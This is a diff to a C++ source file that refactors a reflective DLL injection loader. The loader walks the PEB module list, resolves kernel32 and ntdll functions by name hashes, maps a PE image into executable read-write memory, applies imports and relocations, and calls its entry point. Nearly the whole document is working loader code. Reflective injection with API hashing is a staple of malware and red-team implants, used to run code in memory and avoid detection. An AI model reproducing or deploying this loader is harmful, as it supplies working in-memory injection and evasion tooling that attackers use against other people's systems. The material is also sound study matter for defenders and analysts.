@@ -7,30 +7,10 @@ using DLLEntry = BOOL(WINAPI *)(HINSTANCE dll, DWORD reason, LPVOID reserved);
 // This function is invoked by DLL Loader with Reflective DLL Injection technique.
 DLLEXPORT BOOL ReflectiveDllLoader(LPVOID lpParameter)
 {   
-    // Brute force DLL base address
+    // Get image base address
     ULONG_PTR uLibAddr = (ULONG_PTR)ReflectiveCaller();
-    // ULONG_PTR uLibAddr = (ULONG_PTR)ReflectiveDllLoader;
-
-    LOADLIBRARYA pLoadLibraryA     = NULL;
-	GETPROCADDRESS pGetProcAddress = NULL;
-	VIRTUALALLOC pVirtualAlloc     = NULL;
-	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;
-
-    ULONG_PTR uBaseAddr;
-    ULONG_PTR uExportDir;
-    ULONG_PTR uNames;
-    ULONG_PTR uNameOrdinals;
-    ULONG_PTR uAddresses;
-    DWORD dwHashValue;
 
     ULONG_PTR uHeaderValue;
-    ULONG_PTR uValueA;
-	ULONG_PTR uValueB;
-	ULONG_PTR uValueC;
-	ULONG_PTR uValueD;
-	ULONG_PTR uValueE;
-
-    USHORT uCounter;
 
     while (TRUE)
     {
@@ -49,311 +29,291 @@ DLLEXPORT BOOL ReflectiveDllLoader(LPVOID lpParameter)
     }
 
     // Get pointer to PEB
+	PPEB pPeb = nullptr;
     #ifdef _WIN64
-        uBaseAddr = __readgsqword(0x60);
+		pPeb =(PPEB) __readgsqword(0x60);
     #else
-        uBaseAddr = __readfsqword(0x30);
+		pPeb = (PPEB)__readfsqword(0x30);
     #endif
 
-    uBaseAddr = (ULONG_PTR)((PPEB)uBaseAddr)->Ldr;
+	Procs::LPPROC_LOADLIBRARYA lpLoadLibraryA     = nullptr;
+	Procs::LPPROC_GETPROCADDRESS lpGetProcAddress = nullptr;
+	Procs::LPPROC_VIRTUALALLOC lpVirtualAlloc     = nullptr;
+	Procs::LPPROC_NTFLUSHINSTRUCTIONCACHE lpNtFlushInstructionCache = nullptr;
 
-    uValueA = (ULONG_PTR)((PPEB_LDR_DATA)uBaseAddr)->InMemoryOrderModuleList.Flink;
-    while (uValueA)
+	PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)pPeb->Ldr;
+	// Get the first entry
+	PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)pLdr->InLoadOrderModuleList.Flink;
+
+    while (pDte)
     {
-        uValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY_R)uValueA)->BaseDllName.Buffer;
-        uCounter = ((PLDR_DATA_TABLE_ENTRY_R)uValueA)->BaseDllName.Length;
-        uValueC = 0;
+        ULONG_PTR uCurrModuleName = (ULONG_PTR)pDte->BaseDllName.Buffer;
+        USHORT uCurrModuleNameLen = pDte->BaseDllName.Length;
+    	DWORD dwHash = 0;
 
         do
         {
-            uValueC = rotate((DWORD)uValueC);
-            if (*((BYTE*)uValueB) >= 'a')
-                uValueC += *((BYTE*)uValueB) - 0x20;
+            dwHash = rotate(dwHash);
+			// if a character is lowercase, convert to uppercase.
+            if (*((BYTE*)uCurrModuleName) >= 'a')
+                dwHash += *((BYTE*)uCurrModuleName) - 0x20;
             else
-                uValueC += *((BYTE*)uValueB);
-            uValueB++;
-        } while (--uCounter);
+                dwHash += *((BYTE*)uCurrModuleName);
+            uCurrModuleName++;
+        } while (--uCurrModuleNameLen);
 
-        // Compare the hash with the that of kernel32.dll
-        if ((DWORD)uValueC == HASH_KERNEL32DLL)
-		// if (Procs::GetHashFromStringPtr((PVOID)uValueB, uCounter) == HASH_MODULE_KERNEL32)
-        {
-            // get this modules base address
-			uBaseAddr = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY_R)uValueA)->DllBase;
+		// dwHash = HASH_IV;
+        // do
+        // {
+		// 	int c;
+		// 	// if a character is lowercase, convert it to uppercase.
+        //     if (*((BYTE*)uCurrModuleName) >= 'a')
+        //         c = *((BYTE*)uCurrModuleName) - 0x20;
+        //     else
+        //         c = *((BYTE*)uCurrModuleName);
 
-			// get the VA of the modules NT Header
-			uExportDir = uBaseAddr + ((PIMAGE_DOS_HEADER)uBaseAddr)->e_lfanew;
+		// 	dwHash = dwHash * RANDOM_ADDR + c;
+        //     uCurrModuleName++;
+        // } while (--uCurrModuleNameLen);
+		// dwHash = dwHash & 0xFFFFFFFF;
 
-			// uiNameArray = the address of the modules export directory entry
-			uNames = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-
-			// get the VA of the export directory
-			uExportDir = (uBaseAddr + ((PIMAGE_DATA_DIRECTORY)uNames)->VirtualAddress);
-
-			// get the VA for the array of name pointers
-			uNames = (uBaseAddr + ((PIMAGE_EXPORT_DIRECTORY)uExportDir)->AddressOfNames);
+        if (dwHash == HASH_KERNEL32DLL)
+        // if (dwHash == HASH_MODULE_KERNEL32)
+		// if (Procs::GetHashFromStringPtr((PVOID)pDte->BaseDllName.Buffer, pDte->BaseDllName.Length) == HASH_MODULE_KERNEL32)
+		{
+			ULONG_PTR uDllBase = (ULONG_PTR)pDte->DllBase;
+			PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uDllBase + ((PIMAGE_DOS_HEADER)uDllBase)->e_lfanew);
+			PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)&(pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
+			PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(uDllBase + pDataDir->VirtualAddress);
 			
-			// get the VA for the array of name ordinals
-			uNameOrdinals = (uBaseAddr + ((PIMAGE_EXPORT_DIRECTORY)uExportDir)->AddressOfNameOrdinals);
+			ULONG_PTR uFuncNames = uDllBase + pExportDir->AddressOfNames;
+			ULONG_PTR uFuncNameOrdinals = uDllBase + pExportDir->AddressOfNameOrdinals;
 
-			uCounter = 3;
+			uCurrModuleNameLen = 3;
 
-            // Loop while we still have imports to find
-            while (uCounter > 0)
+            while (uCurrModuleNameLen > 0)
             {
-                // compute the hash values for this function name
-				dwHashValue = hash((char*)(uBaseAddr + DEREF_32(uNames)));
+				DWORD dwFuncHash = Procs::GetHashFromString((char*)(uDllBase + DEREF_32(uFuncNames)));
 				
 				// if we have found a function we want we get its virtual address
 				if(
-                    dwHashValue == HASH_LOADLIBRARYA ||
-                    dwHashValue == HASH_GETPROCADDRESS ||
-                    dwHashValue == HASH_VIRTUALALLOC
+                    dwFuncHash == HASH_FUNC_LOADLIBRARYA ||
+                    dwFuncHash == HASH_FUNC_GETPROCADDRESS ||
+                    dwFuncHash == HASH_FUNC_VIRTUALALLOC
                 ) {
-					// get the VA for the array of addresses
-					uAddresses = (uBaseAddr + ((PIMAGE_EXPORT_DIRECTORY)uExportDir)->AddressOfFunctions);
+					ULONG_PTR uFuncAddresses = uDllBase + pExportDir->AddressOfFunctions;
 
 					// use this functions name ordinal as an index into the array of name pointers
-					uAddresses += (DEREF_16(uNameOrdinals) * sizeof(DWORD));
+					uFuncAddresses += (DEREF_16(uFuncNameOrdinals) * sizeof(DWORD));
 
 					// store this functions VA
-					if(dwHashValue == HASH_LOADLIBRARYA)
-						pLoadLibraryA = (LOADLIBRARYA)(uBaseAddr + DEREF_32(uAddresses));
-					else if(dwHashValue == HASH_GETPROCADDRESS)
-						pGetProcAddress = (GETPROCADDRESS)(uBaseAddr + DEREF_32(uAddresses));
-					else if(dwHashValue == HASH_VIRTUALALLOC )
-						pVirtualAlloc = (VIRTUALALLOC)(uBaseAddr + DEREF_32(uAddresses));
+					if(dwFuncHash == HASH_FUNC_LOADLIBRARYA)
+						lpLoadLibraryA = (Procs::LPPROC_LOADLIBRARYA)(uDllBase + DEREF_32(uFuncAddresses));
+					else if(dwFuncHash == HASH_FUNC_GETPROCADDRESS)
+						lpGetProcAddress = (Procs::LPPROC_GETPROCADDRESS)(uDllBase + DEREF_32(uFuncAddresses));
+					else if(dwFuncHash == HASH_FUNC_VIRTUALALLOC )
+						lpVirtualAlloc = (Procs::LPPROC_VIRTUALALLOC)(uDllBase + DEREF_32(uFuncAddresses));
 			
 					// decrement our counter
-					uCounter--;
+					uCurrModuleNameLen--;
 				}
 
 				// get the next exported function name
-				uNames += sizeof(DWORD);
+				uFuncNames += sizeof(DWORD);
 				// get the next exported function name ordinal
-				uNameOrdinals += sizeof(WORD);
+				uFuncNameOrdinals += sizeof(WORD);
             }
         }
-        else if ((DWORD)uValueC == HASH_NTDLLDLL)
-        {
-            // get this modules base address
-			uBaseAddr = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY_R)uValueA)->DllBase;
-
-			// get the VA of the modules NT Header
-			uExportDir = uBaseAddr + ((PIMAGE_DOS_HEADER)uBaseAddr)->e_lfanew;
-
-			// uiNameArray = the address of the modules export directory entry
-			uNames = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-
-			// get the VA of the export directory
-			uExportDir = (uBaseAddr + ((PIMAGE_DATA_DIRECTORY)uNames)->VirtualAddress);
-
-			// get the VA for the array of name pointers
-			uNames = (uBaseAddr + ((PIMAGE_EXPORT_DIRECTORY)uExportDir)->AddressOfNames);
+        else if (dwHash == HASH_NTDLLDLL)
+        // else if (dwHash == HASH_MODULE_NTDLL)
+		// else if (Procs::GetHashFromStringPtr((PVOID)pDte->BaseDllName.Buffer, pDte->BaseDllName.Length) == HASH_MODULE_NTDLL)
+		{
+			ULONG_PTR uDllBase = (ULONG_PTR)pDte->DllBase;
+			PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uDllBase + ((PIMAGE_DOS_HEADER)uDllBase)->e_lfanew);
+			PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];			
+			PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(uDllBase + pDataDir->VirtualAddress);
 			
-			// get the VA for the array of name ordinals
-			uNameOrdinals = (uBaseAddr + ((PIMAGE_EXPORT_DIRECTORY)uExportDir)->AddressOfNameOrdinals);
+			ULONG_PTR uFuncNames = (uDllBase + pExportDir->AddressOfNames);
+			ULONG_PTR uFuncNameOrdinals = (uDllBase + pExportDir->AddressOfNameOrdinals);
 
-			uCounter = 1;
+			uCurrModuleNameLen = 1;
 
             // loop while we still have imports to find
-			while(uCounter > 0)
+			while(uCurrModuleNameLen > 0)
 			{
-				// compute the hash values for this function name
-				dwHashValue = hash((char*)(uBaseAddr + DEREF_32(uNames)));
+				DWORD dwFuncHash = Procs::GetHashFromString((char*)(uDllBase + DEREF_32(uFuncNames)));
 				
 				// if we have found a function we want we get its virtual address
-				if(dwHashValue == HASH_NTFLUSHINSTRUCTIONCACHE)
+				if(dwFuncHash == HASH_FUNC_NTFLUSHINSTRUCTIONCACHE)
 				{
 					// get the VA for the array of addresses
-					uAddresses = (uBaseAddr + ((PIMAGE_EXPORT_DIRECTORY)uExportDir)->AddressOfFunctions);
+					ULONG_PTR uFuncAddresses = uDllBase + pExportDir->AddressOfFunctions;
 
 					// use this functions name ordinal as an index into the array of name pointers
-					uAddresses += (DEREF_16(uNameOrdinals) * sizeof(DWORD));
+					uFuncAddresses += (DEREF_16(uFuncNameOrdinals) * sizeof(DWORD));
 
 					// store this functions VA
-					if(dwHashValue == HASH_NTFLUSHINSTRUCTIONCACHE)
-						pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)(uBaseAddr + DEREF_32(uAddresses));
+					if(dwFuncHash == HASH_FUNC_NTFLUSHINSTRUCTIONCACHE)
+						lpNtFlushInstructionCache = (Procs::LPPROC_NTFLUSHINSTRUCTIONCACHE)(uDllBase + DEREF_32(uFuncAddresses));
 
 					// decrement our counter
-					uCounter--;
+					uCurrModuleNameLen--;
 				}
 
 				// get the next exported function name
-				uNames += sizeof(DWORD);
+				uFuncNames += sizeof(DWORD);
 				// get the next exported function name ordinal
-				uNameOrdinals += sizeof(WORD);
+				uFuncNameOrdinals += sizeof(WORD);
 			}
         }
 
-        if (pLoadLibraryA && pGetProcAddress && pVirtualAlloc && pNtFlushInstructionCache)
+        if (lpLoadLibraryA && lpGetProcAddress && lpVirtualAlloc && lpNtFlushInstructionCache)
             break;
 
-        uValueA = DEREF(uValueA);
+		// Get the next entry
+		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
     }
 
     // get the VA of the NT Header for the PE to be loaded
-	uHeaderValue = uLibAddr + ((PIMAGE_DOS_HEADER)uLibAddr)->e_lfanew;
+	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uLibAddr + ((PIMAGE_DOS_HEADER)uLibAddr)->e_lfanew);
 
 	// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
 	// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
-	uBaseAddr = (ULONG_PTR)pVirtualAlloc(
+	ULONG_PTR uBuffer = (ULONG_PTR)lpVirtualAlloc(
         NULL,
-        ((PIMAGE_NT_HEADERS)uHeaderValue)->OptionalHeader.SizeOfImage,
+        pNtHeaders->OptionalHeader.SizeOfImage,
         MEM_RESERVE | MEM_COMMIT,
         PAGE_EXECUTE_READWRITE
     );
 
 	// we must now copy over the headers
-	uValueA = ((PIMAGE_NT_HEADERS)uHeaderValue)->OptionalHeader.SizeOfHeaders;
-	uValueB = uLibAddr;
-	uValueC = uBaseAddr;
+	ULONG_PTR uLibAddr2 = uLibAddr;
+	ULONG_PTR uBuffer2 = uBuffer;
 
-	while(uValueA--)
-		*(BYTE*)uValueC++ = *(BYTE*)uValueB++;
+	DWORD dwSizeOfHeaders = pNtHeaders->OptionalHeader.SizeOfHeaders;
+	while(dwSizeOfHeaders--)
+		*(BYTE*)uBuffer2++ = *(BYTE*)uLibAddr2++;
 
-	// uiValueA = the VA of the first section
-	uValueA = ((ULONG_PTR)&((PIMAGE_NT_HEADERS)uHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uHeaderValue)->FileHeader.SizeOfOptionalHeader);
+	ULONG_PTR uSecHeader = (ULONG_PTR)&pNtHeaders->OptionalHeader + pNtHeaders->FileHeader.SizeOfOptionalHeader;
+	ULONG_PTR uNumOfSections = pNtHeaders->FileHeader.NumberOfSections;
 
-    // itterate through all sections, loading them into memory.
-	uValueE = ((PIMAGE_NT_HEADERS)uHeaderValue)->FileHeader.NumberOfSections;
-	while(uValueE--)
+	while(uNumOfSections--)
 	{
-		// uiValueB is the VA for this section
-		uValueB = (uBaseAddr + ((PIMAGE_SECTION_HEADER)uValueA)->VirtualAddress);
-
-		// uiValueC if the VA for this sections data
-		uValueC = (uLibAddr + ((PIMAGE_SECTION_HEADER)uValueA)->PointerToRawData );
+		ULONG_PTR uSecVA = (uBuffer + ((PIMAGE_SECTION_HEADER)uSecHeader)->VirtualAddress);
+		ULONG_PTR uPtrToRawData = uLibAddr + ((PIMAGE_SECTION_HEADER)uSecHeader)->PointerToRawData;
 
 		// copy the section over
-		uValueD = ((PIMAGE_SECTION_HEADER)uValueA)->SizeOfRawData;
+		ULONG_PTR uSizeOfRawData = ((PIMAGE_SECTION_HEADER)uSecHeader)->SizeOfRawData;
 
-		while(uValueD--)
-			*(BYTE*)uValueB++ = *(BYTE*)uValueC++;
+		while(uSizeOfRawData--)
+			*(BYTE*)uSecVA++ = *(BYTE*)uPtrToRawData++;
 
 		// get the VA of the next section
-		uValueA += sizeof(IMAGE_SECTION_HEADER);
+		uSecHeader += sizeof(IMAGE_SECTION_HEADER);
 	}
 	
     // uiValueB = the address of the import directory
-	uValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+	PIMAGE_DATA_DIRECTORY pDataDir =  (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
 	
-	// we assume their is an import table to process
-	// uiValueC is the first entry in the import table
-	uValueC = (uBaseAddr + ((PIMAGE_DATA_DIRECTORY)uValueB)->VirtualAddress);
+	ULONG_PTR uImportEntry = uBuffer + pDataDir->VirtualAddress;
 
-    while(((PIMAGE_IMPORT_DESCRIPTOR)uValueC)->Name)
+    while(((PIMAGE_IMPORT_DESCRIPTOR)uImportEntry)->Name)
     {
         // use LoadLibraryA to load the imported module into memory
-		uLibAddr = (ULONG_PTR)pLoadLibraryA((LPCSTR)(uBaseAddr + ((PIMAGE_IMPORT_DESCRIPTOR)uValueC)->Name));
+		uLibAddr = (ULONG_PTR)lpLoadLibraryA((LPCSTR)(uBuffer + ((PIMAGE_IMPORT_DESCRIPTOR)uImportEntry)->Name));
 
-		// uiValueD = VA of the OriginalFirstThunk
-		uValueD = (uBaseAddr + ((PIMAGE_IMPORT_DESCRIPTOR)uValueC)->OriginalFirstThunk);
+		ULONG_PTR uOrigFirstThunk = uBuffer + ((PIMAGE_IMPORT_DESCRIPTOR)uImportEntry)->OriginalFirstThunk;
 	
 		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
-		uValueA = (uBaseAddr + ((PIMAGE_IMPORT_DESCRIPTOR)uValueC)->FirstThunk);
+		ULONG_PTR uIatVA = uBuffer + ((PIMAGE_IMPORT_DESCRIPTOR)uImportEntry)->FirstThunk;
 
         // itterate through all imported functions, importing by ordinal if no name present
-		while(DEREF(uValueA))
+		while(DEREF(uIatVA))
         {
             // sanity check uiValueD as some compilers only import by FirstThunk
-			if(uValueD && ((PIMAGE_THUNK_DATA)uValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
+			if(uOrigFirstThunk && ((PIMAGE_THUNK_DATA)uOrigFirstThunk)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
 			{
-				// get the VA of the modules NT Header
-				uExportDir = uLibAddr + ((PIMAGE_DOS_HEADER)uLibAddr)->e_lfanew;
+				PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uLibAddr + ((PIMAGE_DOS_HEADER)uLibAddr)->e_lfanew);
+				PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+				PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(uLibAddr + pDataDir->VirtualAddress);
 
-				// uiNameArray = the address of the modules export directory entry
-				uNames = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
-
-				// get the VA of the export directory
-				uExportDir = (uLibAddr + ((PIMAGE_DATA_DIRECTORY)uNames)->VirtualAddress);
-
-				// get the VA for the array of addresses
-				uAddresses = (uLibAddr + ((PIMAGE_EXPORT_DIRECTORY)uExportDir)->AddressOfFunctions);
-
+				ULONG_PTR uFuncAddresses = uLibAddr + pExportDir->AddressOfFunctions;
 				// use the import ordinal (- export ordinal base) as an index into the array of addresses
-				uAddresses += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uValueD)->u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY )uExportDir)->Base) * sizeof(DWORD));
+				uFuncAddresses += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uOrigFirstThunk)->u1.Ordinal) - pExportDir->Base) * sizeof(DWORD));
 
 				// patch in the address for this imported function
-				DEREF(uValueA) = (uLibAddr + DEREF_32(uAddresses));
+				DEREF(uIatVA) = (uLibAddr + DEREF_32(uFuncAddresses));
 			}
             else
 			{
 				// get the VA of this functions import by name struct
-				uValueB = (uBaseAddr + DEREF(uValueA));
+				PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(uBuffer + DEREF(uIatVA));
 
 				// use GetProcAddress and patch in the address for this imported function
-				DEREF(uValueA) = (ULONG_PTR)pGetProcAddress((HMODULE)uLibAddr, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uValueB)->Name);
+				DEREF(uIatVA) = (ULONG_PTR)lpGetProcAddress((HMODULE)uLibAddr, (LPCSTR)pImportByName->Name);
 			}
             // get the next imported function
-			uValueA += sizeof(ULONG_PTR);
-			if(uValueD)
-				uValueD += sizeof(ULONG_PTR);
+			uIatVA += sizeof(ULONG_PTR);
+			if(uOrigFirstThunk)
+				uOrigFirstThunk += sizeof(ULONG_PTR);
         }
         // get the next import
-		uValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);
+		uImportEntry += sizeof(IMAGE_IMPORT_DESCRIPTOR);
     }
 
     // calculate the base address delta and perform relocations (even if we load at desired image base)
-	uLibAddr = uBaseAddr - ((PIMAGE_NT_HEADERS)uHeaderValue)->OptionalHeader.ImageBase;
+	uLibAddr = uBuffer - pNtHeaders->OptionalHeader.ImageBase;
 
-	// uiValueB = the address of the relocation directory
-	uValueB = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uHeaderValue)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+	PIMAGE_DATA_DIRECTORY pRelocDataDir = (PIMAGE_DATA_DIRECTORY)&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 
     // check if their are any relocations present
-	if(((PIMAGE_DATA_DIRECTORY)uValueB)->Size)
+	if(pRelocDataDir->Size)
     {
-        // uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
-		uValueC = (uBaseAddr + ((PIMAGE_DATA_DIRECTORY)uValueB)->VirtualAddress);
+		ULONG_PTR uBaseRelocEntry = uBuffer + pRelocDataDir->VirtualAddress;
 
         // and we itterate through all entries...
-		while(((PIMAGE_BASE_RELOCATION)uValueC)->SizeOfBlock)
+		while(((PIMAGE_BASE_RELOCATION)uBaseRelocEntry)->SizeOfBlock)
         {
-            // uiValueA = the VA for this relocation block
-			uValueA = (uBaseAddr + ((PIMAGE_BASE_RELOCATION)uValueC)->VirtualAddress);
-
-			// uiValueB = number of entries in this relocation block
-			uValueB = (((PIMAGE_BASE_RELOCATION)uValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
+			ULONG_PTR uRelocVA = (uBuffer + ((PIMAGE_BASE_RELOCATION)uBaseRelocEntry)->VirtualAddress);
 
 			// uiValueD is now the first entry in the current relocation block
-			uValueD = uValueC + sizeof(IMAGE_BASE_RELOCATION);
+			ULONG_PTR uRelocEntry = uBaseRelocEntry + sizeof(IMAGE_BASE_RELOCATION);
 
-            // we itterate through all the entries in the current block...
-			while(uValueB--)
+			// Number of entries in this relocation block
+			DWORD dwNumOfEntries = (((PIMAGE_BASE_RELOCATION)uBaseRelocEntry)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
+			while(dwNumOfEntries--)
             {
-                if(((PIMAGE_RELOC)uValueD)->type == IMAGE_REL_BASED_DIR64)
+                if(((PIMAGE_RELOC)uRelocEntry)->type == IMAGE_REL_BASED_DIR64)
                 {
-					*(ULONG_PTR*)(uValueA + ((PIMAGE_RELOC)uValueD)->offset) += uLibAddr;
+					*(ULONG_PTR*)(uRelocVA + ((PIMAGE_RELOC)uRelocEntry)->offset) += uLibAddr;
                 }
-				else if(((PIMAGE_RELOC)uValueD)->type == IMAGE_REL_BASED_HIGHLOW)
+				else if(((PIMAGE_RELOC)uRelocEntry)->type == IMAGE_REL_BASED_HIGHLOW)
                 {
-					*(DWORD *)(uValueA + ((PIMAGE_RELOC)uValueD)->offset) += (DWORD)uLibAddr;
+					*(DWORD *)(uRelocVA + ((PIMAGE_RELOC)uRelocEntry)->offset) += (DWORD)uLibAddr;
                 }
-                else if(((PIMAGE_RELOC)uValueD)->type == IMAGE_REL_BASED_HIGH)
+                else if(((PIMAGE_RELOC)uRelocEntry)->type == IMAGE_REL_BASED_HIGH)
                 {
-					*(WORD *)(uValueA + ((PIMAGE_RELOC)uValueD)->offset) += HIWORD(uLibAddr);
+					*(WORD *)(uRelocVA + ((PIMAGE_RELOC)uRelocEntry)->offset) += HIWORD(uLibAddr);
                 }
-				else if( ((PIMAGE_RELOC)uValueD)->type == IMAGE_REL_BASED_LOW)
+				else if( ((PIMAGE_RELOC)uRelocEntry)->type == IMAGE_REL_BASED_LOW)
                 {
-					*(WORD *)(uValueA + ((PIMAGE_RELOC)uValueD)->offset) += LOWORD(uLibAddr);
+					*(WORD *)(uRelocVA + ((PIMAGE_RELOC)uRelocEntry)->offset) += LOWORD(uLibAddr);
                 }
 
 				// get the next entry in the current relocation block
-				uValueD += sizeof(IMAGE_RELOC);
+				uRelocEntry += sizeof(IMAGE_RELOC);
             }
 
             // get the next entry in the relocation directory
-			uValueC = uValueC + ((PIMAGE_BASE_RELOCATION)uValueC)->SizeOfBlock;
+			uBaseRelocEntry = uBaseRelocEntry + ((PIMAGE_BASE_RELOCATION)uBaseRelocEntry)->SizeOfBlock;
         }
     }
 
-    // uiValueA = the VA of our newly loaded DLL/EXE's entry point
-	uValueA = (uBaseAddr + ((PIMAGE_NT_HEADERS)uHeaderValue)->OptionalHeader.AddressOfEntryPoint);
+	Procs::LPPROC_DLLMAIN lpDllMain = reinterpret_cast<Procs::LPPROC_DLLMAIN>(uBuffer + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
 
-	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
-	pNtFlushInstructionCache((HANDLE)-1, NULL, 0);
+	lpNtFlushInstructionCache((HANDLE)-1, NULL, 0);
 
-    ((DLLMAIN)uValueA)((HINSTANCE)uBaseAddr, DLL_PROCESS_ATTACH, NULL);
+    lpDllMain((HINSTANCE)uBuffer, DLL_PROCESS_ATTACH, NULL);
 
-    return uValueA;
+    return TRUE;
 }
